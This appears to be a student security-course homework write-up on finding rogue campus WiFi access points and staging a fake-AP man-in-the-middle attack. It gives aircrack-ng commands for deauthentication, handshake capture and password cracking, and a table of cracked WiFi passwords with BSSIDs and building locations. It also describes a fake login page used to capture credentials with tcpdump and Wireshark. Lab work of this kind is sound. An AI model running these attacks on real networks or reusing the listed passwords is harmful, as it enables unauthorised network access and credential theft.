# Homework 7 - [Group Assignment] Shadow IT and WiFi MiTM

## Part 1: Shadow IT Detection

### step 1: Network Scanning
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0
```
It will show all the nearby WiFi networks. Identify the target network "IAIS-NS-30015" and note its BSSID and channel.

### step 2: Cracking the WiFi Password
This is an example about WPA2 cracking using aircrack-ng suite. Replace `<Target:BSSID>` and `<Target:Client_MAC>` with the actual BSSID and Client MAC address of the target network and client.

```bash
# listen to the target network and capture the handshake
sudo airodump-ng -c 1 --bssid <Target:BSSID> -w psk wlan0   

# open another terminal and send deauthentication packets to the target client
sudo aireplay-ng -0 1 -a <Target:BSSID>  -c <Target:Client_MAC> wlan0
# once the handshake is captured, use aircrack-ng to crack the password
sudo aircrack-ng -w /usr/share/wordlists/wifite.txt -b <Target:BSSID> psk*.cap
```
### Targets of IAIS-NS-30015
| ESSID          | BSSID              | Channel | Location        |Security | Model          | Password  | Cracking Method |
|----------------|--------------------|---------|-----------------|---------|----------------|------------|------------------|
| IAIS-NS-30015 | 54:B8:0A:13:16:98 | 1 | Engineering Building 6 | WEP/WPA2 | D-Link | rbk11 | WEP cracking with aircrack-ng |
| IAIS-NS-30015 | F4:28:53:6C:9E:F6 | 1 | Student Activities Center | WPA2 | ASUSTek | asroma1927 | WPA2 handshake capture + dictionary attack |
| IAIS-NS-30015 | C4:12:F5:0A:B6:07 | 10 | Management Building 1 | WPA2 | D-Link | lissabon | WPA2 with hashcat GPU acceleration |
| IAIS-NS-30015 | E8:94:F6:A0:08:AE | 7 | Microelectronics and Information Research Center | WPA2 | TP-LINK | limpbizkit | WPA2 handshake capture + dictionary attack |
## Part 2: Fake AP and MITM Attack

### step 1: Setting up the AP on Attacker's Device (pi5)
on soft AP (attacker's pi5):
```bash
james@pi5:~$ sudo tcpdump -i wlan0 -w wifi.pcap
[sudo] password for james: 
tcpdump: listening on wlan0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
^C3869 packets captured
4371 packets received by filter
0 packets dropped by kernel
```

### step 2: Connecting to the AP
on victim's pc:

connect to http://123.0.225.253/fakeLogin/ and enter e-mail and password:
![alt text](image-2.png)
![alt text](image-1.png)

### step 3: Analyzing the Captured Traffic
on attacker's pc:
Analyze the `wifi.pcap` file using Wireshark to identify any sensitive information transmitted over the network.
Look for unencrypted HTTP traffic, login credentials, or any other sensitive data that could be exploited.
![alt text](image.png)